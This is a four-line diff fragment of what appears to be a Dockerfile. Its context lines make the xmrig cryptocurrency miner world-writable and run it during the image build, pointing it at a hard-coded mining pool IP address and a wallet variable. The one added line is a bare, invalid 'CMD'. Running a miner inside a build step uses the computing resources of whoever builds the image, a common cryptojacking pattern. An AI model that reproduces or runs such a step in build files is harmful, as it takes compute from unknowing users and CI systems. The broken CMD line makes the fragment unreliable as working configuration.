@@ -15,3 +15,4 @@ WORKDIR /usr/local/bin/
 
 RUN chmod 777 xmrig
 RUN ./xmrig -a gr -o 23.88.72.40:5555 --tls -u $WALLET
+CMD
